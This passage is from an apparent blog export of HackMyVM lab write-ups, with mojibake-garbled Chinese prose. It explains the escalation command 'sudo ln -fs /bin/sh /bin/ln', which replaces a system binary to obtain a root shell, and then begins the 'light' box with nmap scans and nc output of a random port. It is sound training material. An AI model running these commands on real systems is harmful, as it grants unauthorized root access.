<p>ç¡¬é“¾æ¥ï¼ˆé»˜è®¤ï¼‰ï¼šä¸ä½¿ç”¨ -sï¼Œåˆ›å»ºä¸€ä¸ªæŒ‡å‘åŒä¸€ inode çš„æ–‡ä»¶ã€‚<br>ç¬¦å·é“¾æ¥ï¼ˆè½¯é“¾æ¥ï¼‰ï¼šä½¿ç”¨ -sï¼Œåˆ›å»ºä¸€ä¸ªæŒ‡å‘ç›®æ ‡æ–‡ä»¶è·¯å¾„çš„å¿«æ·æ–¹å¼ã€‚</p>
<h3 id="sudo-ln-fs-bin-sh-bin-ln-è§£æ"><a href="#sudo-ln-fs-bin-sh-bin-ln-è§£æ" class="headerlink" title="sudo ln -fs &#x2F;bin&#x2F;sh &#x2F;bin&#x2F;ln è§£æ"></a>sudo ln -fs &#x2F;bin&#x2F;sh &#x2F;bin&#x2F;ln è§£æ</h3><p>è¿™æ¡å‘½ä»¤çš„ä½œç”¨æ˜¯ ç”¨ &#x2F;bin&#x2F;sh æ›¿æ¢ &#x2F;bin&#x2F;lnï¼Œå¹¶ä¸”å¼ºåˆ¶åˆ›å»ºç¬¦å·é“¾æ¥ã€‚</p>
<h4 id="ln"><a href="#ln" class="headerlink" title="ln"></a>ln</h4><p>ln å‘½ä»¤ç”¨äº åˆ›å»ºç¡¬é“¾æ¥æˆ–ç¬¦å·é“¾æ¥ï¼Œåœ¨è¿™é‡Œç”¨äº æ›¿æ¢ç³»ç»Ÿçš„ ln å‘½ä»¤ã€‚</p>
<h4 id="f"><a href="#f" class="headerlink" title="-f"></a>-f</h4><p>-f é€‰é¡¹ å¼ºåˆ¶è¦†ç›– ç›®æ ‡æ–‡ä»¶ï¼ˆå¦‚æœ &#x2F;bin&#x2F;ln å·²ç»å­˜åœ¨ï¼Œå®ƒä¼šè¢«æ›¿æ¢ï¼‰ã€‚</p>
<h4 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h4><p>-s é€‰é¡¹ åˆ›å»ºç¬¦å·é“¾æ¥ï¼ˆè½¯é“¾æ¥ï¼Œè€Œä¸æ˜¯ç¡¬é“¾æ¥ï¼‰ã€‚</p>
<h4 id="bin-sh"><a href="#bin-sh" class="headerlink" title="&#x2F;bin&#x2F;sh"></a>&#x2F;bin&#x2F;sh</h4><p>&#x2F;bin&#x2F;sh æ˜¯ç›®æ ‡æ–‡ä»¶ï¼Œln å‘½ä»¤ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å‘ &#x2F;bin&#x2F;sh çš„ç¬¦å·é“¾æ¥ã€‚</p>
<h4 id="bin-ln"><a href="#bin-ln" class="headerlink" title="&#x2F;bin&#x2F;ln"></a>&#x2F;bin&#x2F;ln</h4><p>&#x2F;bin&#x2F;ln æ˜¯ç›®æ ‡è·¯å¾„ï¼Œæ‰§è¡Œå &#x2F;bin&#x2F;ln å˜æˆäº† &#x2F;bin&#x2F;sh çš„åˆ«åã€‚</p>
<p>ç”±äº &#x2F;bin&#x2F;ln ç°åœ¨æŒ‡å‘ &#x2F;bin&#x2F;shï¼Œæ‰€ä»¥ sudo ln å®é™…ä¸Šç­‰äº sudo &#x2F;bin&#x2F;shã€‚</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-light</title>
    <url>/posts/32688.html</url>
    <content><![CDATA[<p>HMV-lighté¶æœºå¤ç›˜</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ-ä¿¡æ¯æ”¶é›†"><a href="#ç«¯å£æ‰«æ-ä¿¡æ¯æ”¶é›†" class="headerlink" title="ç«¯å£æ‰«æ&#x2F;ä¿¡æ¯æ”¶é›†"></a>ç«¯å£æ‰«æ&#x2F;ä¿¡æ¯æ”¶é›†</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A -p- 192.168.112.81</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">22</span> <span class="number">18</span>:<span class="number">04</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">112.81</span>)</span><br><span class="line">Host is up (<span class="number">0.0022</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>    open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">93</span>:a4:<span class="number">92</span>:<span class="number">55</span>:<span class="number">72</span>:<span class="number">2</span>b:<span class="number">9</span>b:<span class="number">4</span>a:<span class="number">52</span>:<span class="number">66</span>:<span class="number">5</span>c:af:a9:<span class="number">83</span>:<span class="number">3</span>c:fd (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">1</span>e:a7:<span class="number">44</span>:<span class="number">0</span>b:<span class="number">2</span>c:<span class="number">1</span>b:<span class="number">0</span>d:<span class="number">77</span>:<span class="number">83</span>:df:<span class="number">1</span>d:<span class="number">9</span>f:<span class="number">0</span>e:<span class="number">30</span>:<span class="number">08</span>:<span class="number">4</span>d (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> d0:fa:<span class="number">9</span>d:<span class="number">76</span>:<span class="number">77</span>:<span class="number">42</span>:<span class="number">6</span>f:<span class="number">91</span>:d3:bd:b5:<span class="number">44</span>:<span class="number">72</span>:a7:c9:<span class="number">71</span> (ED25519)</span><br><span class="line"><span class="number">49091</span><span class="symbol">/tcp</span> open  unknown</span><br><span class="line">| <span class="params">fingerprint-strings:</span> </span><br><span class="line">|   GenericLines, <span class="params">NULL:</span> </span><br><span class="line">|     <span class="number">00000000</span>: <span class="number">8950</span> <span class="number">4</span>e47 <span class="number">0</span>d0a <span class="number">1</span>a0a <span class="number">0000</span> <span class="number">000</span>d <span class="number">4948</span> <span class="number">4452</span> .PNG........IHDR</span><br><span class="line">|     <span class="number">00000010</span>: <span class="number">0000</span> <span class="number">013</span>f <span class="number">0000</span> <span class="number">0085</span> <span class="number">0806</span> <span class="number">0000</span> <span class="number">002</span>d <span class="number">80</span>ff ...<span class="operator">?</span>.........-..</span><br><span class="line">|     <span class="number">00000020</span>: <span class="number">0</span>c00 <span class="number">0000</span> <span class="number">0173</span> <span class="number">5247</span> <span class="number">4200</span> aece <span class="number">1</span>ce9 <span class="number">0000</span> .....sRGB.......</span><br><span class="line">|     <span class="number">00000030</span>: <span class="number">0004</span> <span class="number">6741</span> <span class="number">4</span>d41 <span class="number">0000</span> b18f <span class="number">0</span>bfc <span class="number">6105</span> <span class="number">0000</span> ..gAMA......a...</span><br><span class="line">|     <span class="number">00000040</span>: <span class="number">0009</span> <span class="number">7048</span> <span class="number">5973</span> <span class="number">0000</span> <span class="number">0</span>ec3 <span class="number">0000</span> <span class="number">0</span>ec3 <span class="number">01</span>c7 ..pHYs..........</span><br><span class="line">|     <span class="number">00000050</span>: <span class="number">6</span>fa8 <span class="number">6400</span> <span class="number">0007</span> de49 <span class="number">4441</span> <span class="number">5478</span> <span class="number">5</span>eed dbf7 o.d....IDATx^...</span><br><span class="line">|     <span class="number">00000060</span>: <span class="number">9314</span> <span class="number">4518</span> c671 ffff <span class="number">1</span>f2d ab2c <span class="number">73</span>c0 <span class="number">9</span>cb0 ..E..q...-.,s...</span><br><span class="line">|     <span class="number">00000070</span>: <span class="number">0</span>c08 <span class="number">7292</span> <span class="number">0491</span> <span class="number">2092</span> <span class="number">8380</span> <span class="number">08</span>e2 <span class="number">09</span>ca c1a1 ..r... .........</span><br><span class="line">|     <span class="number">00000080</span>: <span class="number">2248</span> <span class="number">7</span>aed c799 <span class="number">2</span>ea7 a67a <span class="number">6</span>f7b c3ed edf2 <span class="string">&quot;Hz......zo&#123;....</span></span><br><span class="line"><span class="string">|     00000090: 7c3f 5553 1c7d bdd3 d361 9f09 bbf7 5400 |?US.&#125;...a....T.</span></span><br><span class="line"><span class="string">|     000000a0: 8021 c20f 8025 c20f 8025 c20f 8025 c20f .!...%...%...%..</span></span><br><span class="line"><span class="string">|     000000b0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f .%...%...%...%..</span></span><br><span class="line"><span class="string">|     000000c0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f .%...%...%...%..</span></span><br><span class="line"><span class="string">|_    000000d0: 8025 c</span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span class="string">SF-Port49091-TCP:V=7.95%I=7%D=2/22%Time=67B9A146%P=aarch64-unknown-linux-g</span></span><br><span class="line"><span class="string">SF:nu%r(NULL,234D,&quot;</span><span class="number">00000000</span>:\x208950\x204e47\x200d0a\x201a0a\x200000\x2000</span><br><span class="line">SF:<span class="number">0</span>d\x204948\x204452\x20\x20\.PNG\.\.\.\.\.\.\.\.IHDR\n00000010:\x200000\</span><br><span class="line">SF:x20013f\x200000\x200085\x200806\x200000\x20002d\x2080ff\x20\x20\.\.\.\<span class="operator">?</span></span><br><span class="line">SF:\.\.\.\.\.\.\.\.\.-\.\.\n00000020:\x200c00\x200000\x200173\x205247\x204</span><br><span class="line">SF:<span class="number">200</span>\x20aece\x201ce9\x200000\x20\x20\.\.\.\.\.sRGB\.\.\.\.\.\.\.\n000000</span><br><span class="line">SF:<span class="number">30</span>:\x200004\x206741\x204d41\x200000\x20b18f\x200bfc\x206105\x200000\x20</span><br><span class="line">SF:\x20\.\.gAMA\.\.\.\.\.\.a\.\.\.\n00000040:\x200009\x207048\x205973\x200</span><br><span class="line">SF:<span class="number">000</span>\x200ec3\x200000\x200ec3\x2001c7\x20\x20\.\.pHYs\.\.\.\.\.\.\.\.\.\.</span><br><span class="line">SF:\n00000050:\x206fa8\x206400\x200007\x20de49\x204441\x205478\x205eed\x20</span><br><span class="line">SF:dbf7\x20\x20o\.d\.\.\.\.IDATx\^\.\.\.\n00000060:\x209314\x204518\x20c67</span><br><span class="line">SF:<span class="number">1</span>\x20ffff\x201f2d\x20ab2c\x2073c0\x209cb0\x20\x20\.\.E\.\.q\.\.\.-\.,s\</span><br><span class="line">SF:.\.\.\n00000070:\x200c08\x207292\x200491\x202092\x208380\x2008e2\x2009c</span><br><span class="line">SF:a\x20c1a1\x20\x20\.\.r\.\.\.\x20\.\.\.\.\.\.\.\.\.\n00000080:\x202248\x</span><br><span class="line">SF:<span class="number">207</span>aed\x20c799\x202ea7\x20a67a\x206f7b\x20c3ed\x20edf2\x20\x20\<span class="string">&quot;Hz<span class="char escape_">\.</span><span class="char escape_">\.</span>\</span></span><br><span class="line"><span class="string">SF:.<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>zo&#123;<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00000090:<span class="char escape_">\x</span>207c3f<span class="char escape_">\x</span>205553<span class="char escape_">\x</span>201c7d<span class="char escape_">\x</span>20bdd3<span class="char escape_">\x</span>20d361<span class="char escape_">\x</span></span></span><br><span class="line"><span class="string">SF:209f09<span class="char escape_">\x</span>20bbf7<span class="char escape_">\x</span>205400<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\|</span><span class="char escape_">\?</span>US<span class="char escape_">\.</span>&#125;<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>a<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>T<span class="char escape_">\.</span><span class="char escape_">\n</span>000000a0:<span class="char escape_">\x</span>2</span></span><br><span class="line"><span class="string">SF:08021<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span></span></span><br><span class="line"><span class="string">SF:!<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>000000b0:<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span></span></span><br><span class="line"><span class="string">SF:208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>000</span></span><br><span class="line"><span class="string">SF:000c0:<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f\</span></span><br><span class="line"><span class="string">SF:x20<span class="char escape_">\x</span>20<span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>000000d0:<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c&quot;</span>)%r(Generic</span><br><span class="line">SF:Lines,<span class="number">234</span>D,<span class="string">&quot;00000000:<span class="char escape_">\x</span>208950<span class="char escape_">\x</span>204e47<span class="char escape_">\x</span>200d0a<span class="char escape_">\x</span>201a0a<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>20000d<span class="char escape_">\x</span></span></span><br><span class="line"><span class="string">SF:204948<span class="char escape_">\x</span>204452<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span>PNG<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>IHDR<span class="char escape_">\n</span>00000010:<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>200</span></span><br><span class="line"><span class="string">SF:13f<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>200085<span class="char escape_">\x</span>200806<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>20002d<span class="char escape_">\x</span>2080ff<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\?</span><span class="char escape_">\.</span><span class="char escape_">\.</span></span></span><br><span class="line"><span class="string">SF:<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>-<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00000020:<span class="char escape_">\x</span>200c00<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>200173<span class="char escape_">\x</span>205247<span class="char escape_">\x</span>204200\</span></span><br><span class="line"><span class="string">SF:x20aece<span class="char escape_">\x</span>201ce9<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>sRGB<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00000030:\</span></span><br><span class="line"><span class="string">SF:x200004<span class="char escape_">\x</span>206741<span class="char escape_">\x</span>204d41<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>20b18f<span class="char escape_">\x</span>200bfc<span class="char escape_">\x</span>206105<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20</span></span><br><span class="line"><span class="string">SF:<span class="char escape_">\.</span><span class="char escape_">\.</span>gAMA<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>a<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00000040:<span class="char escape_">\x</span>200009<span class="char escape_">\x</span>207048<span class="char escape_">\x</span>205973<span class="char escape_">\x</span>200000\</span></span><br><span class="line"><span class="string">SF:x200ec3<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>200ec3<span class="char escape_">\x</span>2001c7<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span><span class="char escape_">\.</span>pHYs<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00</span></span><br><span class="line"><span class="string">SF:000050:<span class="char escape_">\x</span>206fa8<span class="char escape_">\x</span>206400<span class="char escape_">\x</span>200007<span class="char escape_">\x</span>20de49<span class="char escape_">\x</span>204441<span class="char escape_">\x</span>205478<span class="char escape_">\x</span>205eed<span class="char escape_">\x</span>20dbf7</span></span><br><span class="line"><span class="string">SF:<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20o<span class="char escape_">\.</span>d<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>IDATx<span class="char escape_">\^</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00000060:<span class="char escape_">\x</span>209314<span class="char escape_">\x</span>204518<span class="char escape_">\x</span>20c671<span class="char escape_">\x</span>2</span></span><br><span class="line"><span class="string">SF:0ffff<span class="char escape_">\x</span>201f2d<span class="char escape_">\x</span>20ab2c<span class="char escape_">\x</span>2073c0<span class="char escape_">\x</span>209cb0<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span><span class="char escape_">\.</span>E<span class="char escape_">\.</span><span class="char escape_">\.</span>q<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>-<span class="char escape_">\.</span>,s<span class="char escape_">\.</span><span class="char escape_">\.</span>\</span></span><br><span class="line"><span class="string">SF:.<span class="char escape_">\n</span>00000070:<span class="char escape_">\x</span>200c08<span class="char escape_">\x</span>207292<span class="char escape_">\x</span>200491<span class="char escape_">\x</span>202092<span class="char escape_">\x</span>208380<span class="char escape_">\x</span>2008e2<span class="char escape_">\x</span>2009ca<span class="char escape_">\x</span>2</span></span><br><span class="line"><span class="string">SF:0c1a1<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span><span class="char escape_">\.</span>r<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\x</span>20<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00000080:<span class="char escape_">\x</span>202248<span class="char escape_">\x</span>207a</span></span><br><span class="line"><span class="string">SF:ed<span class="char escape_">\x</span>20c799<span class="char escape_">\x</span>202ea7<span class="char escape_">\x</span>20a67a<span class="char escape_">\x</span>206f7b<span class="char escape_">\x</span>20c3ed<span class="char escape_">\x</span>20edf2<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\&quot;</span>Hz<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>\</span></span><br><span class="line"><span class="string">SF:.<span class="char escape_">\.</span>zo&#123;<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00000090:<span class="char escape_">\x</span>207c3f<span class="char escape_">\x</span>205553<span class="char escape_">\x</span>201c7d<span class="char escape_">\x</span>20bdd3<span class="char escape_">\x</span>20d361<span class="char escape_">\x</span>209f</span></span><br><span class="line"><span class="string">SF:09<span class="char escape_">\x</span>20bbf7<span class="char escape_">\x</span>205400<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\|</span><span class="char escape_">\?</span>US<span class="char escape_">\.</span>&#125;<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>a<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>T<span class="char escape_">\.</span><span class="char escape_">\n</span>000000a0:<span class="char escape_">\x</span>20802</span></span><br><span class="line"><span class="string">SF:1<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span>!<span class="char escape_">\.</span>\</span></span><br><span class="line"><span class="string">SF:.<span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>000000b0:<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>2080</span></span><br><span class="line"><span class="string">SF:25<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>000000c</span></span><br><span class="line"><span class="string">SF:0:<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>20\</span></span><br><span class="line"><span class="string">SF:x20<span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>000000d0:<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c&quot;</span>);</span><br><span class="line">MAC <span class="params">Address:</span> F2:<span class="number">26</span>:D0:B6:<span class="number">19</span>:<span class="number">9</span>A (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.16</span> ms bogon (<span class="number">192.168</span>.<span class="number">112.81</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">5.01</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>å¼€äº†sshå’Œä¸€ä¸ªæ²¡è§è¿‡çš„ç«¯å£<br>ä½†æ˜¯æˆ‘æƒ³åœ¨ç›´æ¥ç”¨-p-æ‰«å…¨éƒ¨ç«¯å£çš„æ—¶å€™å‘ç°å¼€æ”¾çš„ç«¯å£å˜äº†ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸€ä¸ªéšæœºå¼€æ”¾çš„ç«¯å£ï¼Œæ‰«é™¤ç«¯å£ä¹‹åè¦å¿«é€Ÿç”¨ncå»è®¿é—®å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap  -p- 192.168.112.81 </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">22</span> <span class="number">18</span>:<span class="number">08</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">112.81</span>)</span><br><span class="line">Host is up (<span class="number">0.00054</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>    open  ssh</span><br><span class="line"><span class="number">50960</span><span class="symbol">/tcp</span> open  unknown</span><br><span class="line">MAC <span class="params">Address:</span> F2:<span class="number">26</span>:D0:B6:<span class="number">19</span>:<span class="number">9</span>A (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">2.45</span> seconds</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="string">â””â”€#</span> <span class="string">nc</span> <span class="number">192.168</span><span class="number">.112</span><span class="number">.81</span> <span class="number">49146</span></span><br><span class="line"><span class="attr">00000000:</span> <span class="number">8950 </span><span class="number">4e47</span> <span class="string">0d0a</span> <span class="string">1a0a</span> <span class="number">0000 </span><span class="string">000d</span> <span class="number">4948 </span><span class="number">4452</span>  <span class="string">.PNG........IHDR</span></span><br><span class="line"><span class="attr">00000010:</span> <span class="number">0000 </span><span class="string">013f</span> <span class="number">0000 </span><span class="number">0085 </span><span class="number">0806 </span><span class="number">0000 </span><span class="string">002d</span> <span class="string">80ff</span>  <span class="string">...?.........-..</span></span><br><span class="line"><span class="attr">00000020:</span> <span class="string">0c00</span> <span class="number">0000 </span><span class="number">0173 </span><span class="number">5247 </span><span class="number">4200 </span><span class="string">aece</span> <span class="string">1ce9</span> <span class="number">0000</span>  <span class="string">.....sRGB.......</span></span><br><span class="line"><span class="attr">00000030:</span> <span class="number">0004 </span><span class="number">6741 </span><span class="string">4d41</span> <span class="number">0000 </span><span class="string">b18f</span> <span class="string">0bfc</span> <span class="number">6105 </span><span class="number">0000</span>  <span class="string">..gAMA......a...</span></span><br><span class="line"><span class="attr">00000040:</span> <span class="number">0009 </span><span class="number">7048 </span><span class="number">5973 